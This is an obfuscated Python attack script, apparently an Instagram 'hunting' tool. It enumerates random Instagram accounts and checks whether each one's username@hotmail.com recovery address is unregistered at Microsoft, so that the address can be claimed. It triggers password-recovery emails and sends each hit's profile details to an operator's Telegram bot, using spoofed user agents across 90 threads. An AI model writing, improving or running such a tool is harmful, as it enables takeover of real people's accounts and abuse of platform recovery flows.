AM='https://www.instagram.com'
AL='referer'
AK='origin'
AJ='application/x-www-form-urlencoded'
AI='www.instagram.com'
AH='content-type'
AG='authority'
AF='https://www.instagram.com/api/graphql'
AE='iPhone; CPU iPhone OS 13_6 like Mac OS X'
AD='iPhone; CPU iPhone OS 14_0 like Mac OS X'
AC='Macintosh; Intel Mac OS X 10_14_6'
AB='Macintosh; Intel Mac OS X 10_15_7'
AA='12.0.3'
A9='12.1.2'
A8='13.0.5'
A7='13.1.1'
A6='13.1.2'
A5='\x1b[1;36;40m'
A4='\x1b[1;97;40m'
q='0'
p='accept-language'
o='accept'
n='@hotmail.com'
m=')'
l='; qcom; en_US; 545986'
k='REALME'
j='SONY'
i='VIVO'
h='OPPO'
g='XIAOMI'
f='ONEPLUS'
e='ZTE'
d='ASUS'
c='HTC'
b='LGE/lge'
a='HUAWEI'
Z='SAMSUNG'
Y='x'
X='dpi; '
W='28/9.0'
V='27/8.1'
U='26/8.0'
T='25/7.1.1'
S='24/7.0'
R='23/6.0'
Q='Instagram 311.0.0.32.118 Android ('
P=range
K='user-agent'
H='user'
G='; SM-T'
F='; '
C=str
B=int
from pyfiglet import Figlet
import requests as D,re,random as A,os,sys
from rich import print as AN
from rich.panel import Panel as r
from threading import Thread
import os,time,random as A,pyfiglet,webbrowser as s
from colorama import Fore,Style
t='https://t.me/kyixo'
AO='https://t.me/demonpis'
os.system(f"xdg-open {t}")
s.open(t)
s.open(AO)
u='\x1b[1;31;40m'
AP='\x1b[1;33;40m'
N='\x1b[1;32;40m'
L=A4
L=A4
v=A5
AQ='\x1b[1;35;40m'
AR=A5
N='\x1b[1;32m'
AY='\x1b[1;31m'
AZ='\x1b[1;33m'
v='\x1b[38;5;208m'
AS=Figlet(font='poison')
w=AS.renderText(f"STEIN")
print(w)
Aa=A.choice([u,AP,N,v,AQ,AR])
I,x,J,E,O,Ab,y=0,0,0,0,0,0,[]
AT=input(f"TOKEN :  ")
AU=input(f"ID :  ")
os.system('clear')
def AV(OOO0OOO0OOO0O00OO):
	E=[A6,A7,A8,A9,AA];F=[AB,AC,AD,AE];G=A.choice(E);H=A.choice(F);I=f"Mozilla/5.0 ({H}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{G} Safari/605.1.15 Edg/122.0.0.0"
	try:
		J='https://signup.live.com';L={K:I};B=D.post(J,headers=L);N=B.cookies.get_dict()['amsc'];C=re.search('"apiCanary":"(.*?)"',B.text)
		if C:O=C.group(1);P=O.encode().decode('unicode_escape')
		else:0
		return N,P
	except:M(OOO0OOO0OOO0O00OO)
def z(O0OOOOOOO00O00O00):
	B=O0OOOOOOO00O00O00;global J,E
	try:
		L=''.join(A.choice('1234567890')for B in P(15));H=D.get(AF);N=H.cookies.get_dict().get('csrftoken');I=C(A.randint(150,999));O=Q+[R,S,T,U,V,W][A.randint(0,5)]+F+C(A.randint(100,1300))+X+C(A.randint(200,2000))+Y+C(A.randint(200,2000))+F+[Z,a,b,c,d,e,f,g,h,i,j,k][A.randint(0,11)]+G+I+G+I+l+C(A.randint(111,999))+m;r={'flow':'fxcal','recaptcha_challenge_field':''};s={'email_or_username':B+n,**r};t={AG:AI,o:'*/*',p:'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',AH:AJ,K:O,'viewport-width':'384','x-asbd-id':'129477','x-csrftoken':f"{N}",'x-ig-app-id':L,'x-ig-www-claim':q,'x-instagram-ajax':'1007832499','x-requested-with':'XMLHttpRequest'};H=D.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',headers=t,data=s)
		if'email_or_sms_sen'in H.text:J+=1;M(B)
		else:E+=1
	except D.exceptions.ConnectionError:z(B)
def A0(O00OOO00O00O00O0O):
	B=O00OOO00O00O00O0O;o=0;global J,E
	try:
		H=C(A.randint(150,999));I=Q+[R,S,T,U,V,W][A.randint(0,5)]+F+C(A.randint(100,1300))+X+C(A.randint(200,2000))+Y+C(A.randint(200,2000))+F+[Z,a,b,c,d,e,f,g,h,i,j,k][A.randint(0,11)]+G+H+G+H+l+C(A.randint(111,999))+m;L='https://www.instagram.com/api/v1/web/accounts/check_email/';N={'Host':AI,AK:AM,AL:'https://www.instagram.com/accounts/signup/email/','sec-ch-ua-full-version-list':'"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',K:I};O={'email':B+n};P=D.post(L,headers=N,data=O)
		if'email_is_taken'in P.text:J+=1;M(B)
		else:E+=1
	except D.exceptions.ConnectionError:A0(B)
def M(O00O0O0O000OO0OO0):
	B=O00O0O0O000OO0OO0;global I,x;C=[A6,A7,A8,A9,AA];E=[AB,AC,AD,AE];F=A.choice(C);G=A.choice(E);H=f"Mozilla/5.0 ({G}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{F} Safari/605.1.15 Edg/122.0.0.0"
	try:
		J,L=AV(B);N={AG:'signup.live.com',o:'application/json',p:'en-US,en;q=0.9','canary':L,K:H};O={'amsc':J};P={'signInName':B+n};Q=D.post('https://signup.live.com/API/CheckAvailableSigninNames',cookies=O,headers=N,json=P)
		if'isAvailable'in Q.text:I+=1;A1(B)
		else:0
	except D.exceptions.ConnectionError:M(B)
def AW(O000O0OOOOOOOO000):
	A=O000O0OOOOOOOO000
	try:
		if B(A)>1 and B(A)<1279000:return 2010
		elif B(A)>1279001 and B(A)<17750000:return 2011
		elif B(A)>17750001 and B(A)<279760000:return 2012
		elif B(A)>279760001 and B(A)<900990000:return 2013
		elif B(A)>900990001 and B(A)<1629010000:return 2014
		elif B(A)>1900000000 and B(A)<2500000000:return 2015
		elif B(A)>2500000000 and B(A)<3713668786:return 2016
		elif B(A)>3713668786 and B(A)<5699785217:return 2017
		elif B(A)>5699785217 and B(A)<8507940634:return 2018
		elif B(A)>8507940634 and B(A)<21254029834:return 2019
		else:return'2020-2023'
	except BaseException as C:return C
def A1(O0O00OO0O000000O0):
	F='result';E=None;A=O0O00OO0O000000O0
	try:
		P={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':q,'X-IG-Bandwidth-TotalTime-MS':q,'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};Q={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+A+'"}','ig_sig_key_version':'4'}
		try:R=D.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=P,data=Q);J=R.json()['email']
		except:J=False
		try:B=D.get('https://anonyig.com/api/ig/userInfoByUsername/'+A).json()
		except:B=E
		try:G=B[F][H]['pk_id']
		except:G=E
		try:K=B[F][H]['follower_count']
		except:K=E
		try:L=B[F][H]['following_count']
		except:L=E
		try:M=B[F][H]['media_count']
		except:M=E
		try:N=B[F][H]['full_name']
		except:N=E
		O=AW(G);S='\nHIT\n NAME  {}\n USERNAME  {}\n EMAIL  {}@hotmail.com\n FOLLOWERS  {}\n FOLLOWING  {}\n POST  {}\n DATE  {}\n ID  {}\n RESET  {}\n\n@demonpis || STEIN||\n        '.format(N,A,A,K,L,G,O,M,J);D.post(f"https://api.telegram.org/bot{AT}/sendMessage?chat_id={AU}&text="+C(S));print(w);T='\n     SEMI\tHUNT\n USERNAME  {}\n EMAIL  {}@hotmail.com\n RESET  {}\n    @demonpis || STEIN||\t\n\n        '.format(N,A,A,K,L,G,O,M,J);U=r(T);AN(r(U,title=f"Instagram | {I}"))
	except:A1(A)
def AX(OOO0000OO00000000):
	C='url_chk';B=OOO0000OO00000000;global I,x,E,J,O;D=A.choice(['check_ii',C])
	if D!=C:z(B)
	else:A0(B)
	F=A.randint(5,208);G=f"[38;5;{F}m";O+=1;sys.stdout.write(f"\r  {L}GOOD {N}{I} || {L}GOOD GRAPHS{u}{E}  {L}\r");sys.stdout.flush()
def A2():
	B=C(A.randrange(281874530,514197353))
	if B not in y:y.append(B);return B
	else:A2()
def A3():
	I='PolarisUserHoverCardContentV2Query';global O
	try:
		while True:B=C(A.randint(150,999));J=Q+[R,S,T,U,V,W][A.randint(0,5)]+F+C(A.randint(100,1300))+X+C(A.randint(200,2000))+Y+C(A.randint(200,2000))+F+[Z,a,b,c,d,e,f,g,h,i,j,k][A.randint(0,11)]+G+B+G+B+l+C(A.randint(111,999))+m;L=A2();E=''.join(A.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890')for B in P(32));M={o:'*/*',p:'en,en-US;q=0.9',AH:AJ,'dnt':'1',AK:AM,'priority':'u=1, i',AL:'https://www.instagram.com/instagram/following/',K:J,'x-fb-friendly-name':I,'x-fb-lsd':E};N={'lsd':E,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':I,'variables':'{"userID":"'+C(L)+'","username":"instagram"}','server_timestamps':'true','doc_id':'7717269488336001'};n=D.post(AF,headers=M,data=N);q=n.json()['data'][H]['username'];AX(q)
	except:A3()
for Ac in P(90):Thread(target=A3).start()